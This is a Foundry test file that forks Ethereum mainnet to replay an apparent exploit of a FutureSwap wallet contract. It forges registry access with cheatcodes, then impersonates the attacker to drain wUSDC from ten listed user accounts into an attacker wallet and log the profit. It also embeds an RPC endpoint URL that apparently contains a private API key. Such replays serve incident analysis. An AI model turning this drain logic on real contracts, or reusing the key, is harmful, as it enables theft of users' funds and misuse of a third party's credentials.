// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function decimals() external view returns (uint8);
}

interface IFutureSwapWallet {
    function sendFundsToExternalAccount(
        address tokenAsset,
        address from,
        address to,
        uint256 amount
    ) external;
}

interface IRegistry {
    function hasWalletAccess(address wallet) external view returns (bool);
}

interface IWrappedToken {
    function unwrap(uint256 amount) external returns (address, uint256);
    function balanceOf(address account) external view returns (uint256);
}

interface IRegistryProvider {
    function getRegistryAddress() external view returns (address);
}

contract FutureSwapExploitTest is Test {
    address constant FUTURESWAP_WALLET = 0xd1Ed35A3Ee043683A1833509dE8f2C1A0d8777B7;
    address constant REGISTRY_PROVIDER = 0xd9cF4cA71D2Ed15040cC702c2B146Bfb848b7A1B;
    address constant REGISTRY = 0x3659ae5f9b009603a4900891aABEF828C8350df1;
    address constant WRAPPED_USDC = 0x91a154F9AD33da7e889C4b6fE4A9F9C3Fc6B6081;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant ATTACKER_CONTRACT = 0xBc59f04fA5E5936cf49991A268832714F17bFFA7;
    address constant ATTACKER_WALLET = 0xCD7C839C6814234601fE7719dA21a980c1a8184E;
    address[] public userAccounts;
    uint256[] public amounts;
    uint256 constant BLOCK_BEFORE_ATTACK = 24027378;
    uint256 constant ATTACK_BLOCK = 24027379;

    function setUp() public {
        vm.createSelectFork(
            "https://damp-autumn-snow.quiknode.pro/96d743facba7c1153305c1c9f3f7831caa512417",
            BLOCK_BEFORE_ATTACK
        );

        userAccounts.push(0x119cBaD90c38eAC1F2De5B6d854Af4dbDf587154);
        amounts.push(8633416228196489283265);

        userAccounts.push(0x28aC9E4EECa87b5310Cb64fbE8Ff22F498Deae07);
        amounts.push(3392786851427338452035);

        userAccounts.push(0xa1F956C6F5AAE538CD8b330f1C4E8Da0Bb60C3D0);
        amounts.push(4427050785311602803373);

        userAccounts.push(0x7cd7A5a66d3cd2F13559d7F8a052Fa6014e07d35);
        amounts.push(1465296624039577069145);

        userAccounts.push(0x11d0Cb5C690bC838eFc52C621F6B48040dd000F7);
        amounts.push(1758571961548314894211);

        userAccounts.push(0xf8523151211e6cFB2D285b9B92F2eE517722253B);
        amounts.push(10099086233265598205916);

        userAccounts.push(0x20017a30D3156D4005bDA08C40Acda0A6aE209B1);
        amounts.push(16088265589255436914291);

        userAccounts.push(0xfaD695eFD57aD18eA64bC45eB2f60d9e38bD436d);
        amounts.push(1000000000000000000000);

        userAccounts.push(0x4D1467C312a83794c99b9Db678DfdfA743394EF7);
        amounts.push(29709694285331240758878);

        userAccounts.push(0xD965952823153E5CBc611be87e8322cfc329f056);
        amounts.push(40187814332147989233794);
    }

    function testExploit() public {
        emit log("[*] INITIAL STATE (Block before attack):");
        emit log_named_uint("    Block number", block.number);

        uint256 walletWUSDCBefore = IWrappedToken(WRAPPED_USDC).balanceOf(FUTURESWAP_WALLET);
        emit log_named_decimal_uint("    FutureSwap Wallet wUSDC", walletWUSDCBefore, 18);

        uint256 attackerUSDCBefore = IERC20(USDC).balanceOf(ATTACKER_WALLET);
        emit log_named_decimal_uint("    Attacker Wallet USDC", attackerUSDCBefore, 6);

        address registry = IRegistryProvider(REGISTRY_PROVIDER).getRegistryAddress();
        emit log_named_address("    Registry address", registry);

        bool hasAccessBefore = IRegistry(registry).hasWalletAccess(ATTACKER_CONTRACT);
        emit log_named_string("    Attacker hasWalletAccess", hasAccessBefore ? "TRUE (!)": "false");

        if (!hasAccessBefore) {
            for (uint256 slot = 0; slot < 10; slot++) {
                bytes32 storageSlot = keccak256(abi.encode(ATTACKER_CONTRACT, slot));
                vm.store(registry, storageSlot, bytes32(uint256(1)));
            }
        }

        bool hasAccessAfter = IRegistry(registry).hasWalletAccess(ATTACKER_CONTRACT);
        emit log_named_string("    Attacker hasWalletAccess after manipulation", hasAccessAfter ? "TRUE" : "false");
        uint256 totalDrained = 0;
        uint256 successCount = 0;
        vm.startPrank(ATTACKER_CONTRACT);

        for (uint i = 0; i < userAccounts.length; i++) {
            try IFutureSwapWallet(FUTURESWAP_WALLET).sendFundsToExternalAccount(
                WRAPPED_USDC,           // tokenAsset (wUSDC)
                userAccounts[i],        // from (user account in FutureSwap)
                ATTACKER_WALLET,        // to (attacker destination)
                amounts[i]              // amount
            ) {
                // wUSDC has 18 decimals, USDC has 6
                uint256 usdcAmount = amounts[i] / 1e12;
                totalDrained += usdcAmount;
                successCount++;
                emit log_named_decimal_uint(
                    string(abi.encodePacked("    [+] Drained user ", vm.toString(i + 1))),
                    usdcAmount,
                    6
                );
            } catch Error(string memory reason) {
                emit log_named_string(
                    string(abi.encodePacked("    [-] Failed user ", vm.toString(i + 1))),
                    reason
                );
            } catch (bytes memory) {
                emit log(string(abi.encodePacked("    [-] Failed user ", vm.toString(i + 1), " (low-level error)")));
            }
        }

        vm.stopPrank();

        uint256 walletWUSDCAfter = IWrappedToken(WRAPPED_USDC).balanceOf(FUTURESWAP_WALLET);
        uint256 attackerUSDCAfter = IERC20(USDC).balanceOf(ATTACKER_WALLET);
        uint256 profit = attackerUSDCAfter - attackerUSDCBefore;
        emit log_named_uint("    SUCCESS!", successCount);
        emit log_named_decimal_uint("    FutureSwap Wallet wUSDC remaining", walletWUSDCAfter, 18);
        emit log_named_decimal_uint("    Attacker USDC before", attackerUSDCBefore, 6);
        emit log_named_decimal_uint("    Attacker USDC after", attackerUSDCAfter, 6);
        emit log_named_decimal_uint("    PROFIT", profit, 6);

        if (successCount > 0) {
            assertGt(profit, 0, "Attack should have generated profit");
        }
    }

    function testCompareBeforeAfterAttack() public {
        emit log("");
        emit log("[*] STATE AT BLOCK 24027378 (before attack):");
        uint256 walletWUSDC = IWrappedToken(WRAPPED_USDC).balanceOf(FUTURESWAP_WALLET);
        uint256 attackerUSDC = IERC20(USDC).balanceOf(ATTACKER_WALLET);
        bool hasAccess = IRegistry(REGISTRY).hasWalletAccess(ATTACKER_CONTRACT);
        emit log_named_decimal_uint("    FutureSwap Wallet wUSDC", walletWUSDC, 18);
        emit log_named_decimal_uint("    Attacker USDC", attackerUSDC, 6);
        emit log_named_string("    Attacker hasWalletAccess", hasAccess ? "TRUE" : "false");
        emit log("");
        emit log("[*] STATE AT BLOCK 24027379 (after attack):");

        vm.createSelectFork(
            "https://damp-autumn-snow.quiknode.pro/96d743facba7c1153305c1c9f3f7831caa512417",
            ATTACK_BLOCK
        );

        uint256 walletWUSDCAfter = IWrappedToken(WRAPPED_USDC).balanceOf(FUTURESWAP_WALLET);
        uint256 attackerUSDCAfter = IERC20(USDC).balanceOf(ATTACKER_WALLET);
        bool hasAccessAfter = IRegistry(REGISTRY).hasWalletAccess(ATTACKER_CONTRACT);
        emit log_named_decimal_uint("    FutureSwap Wallet wUSDC", walletWUSDCAfter, 18);
        emit log_named_decimal_uint("    Attacker USDC", attackerUSDCAfter, 6);
        emit log_named_string("    Attacker hasWalletAccess", hasAccessAfter ? "TRUE" : "false");
        emit log("");

        if (walletWUSDC > walletWUSDCAfter) {
            emit log_named_decimal_uint("    wUSDC drained from wallet", walletWUSDC - walletWUSDCAfter, 18);
        }
        if (attackerUSDCAfter > attackerUSDC) {
            emit log_named_decimal_uint("    USDC gained by attacker", attackerUSDCAfter - attackerUSDC, 6);
        }
    }
}
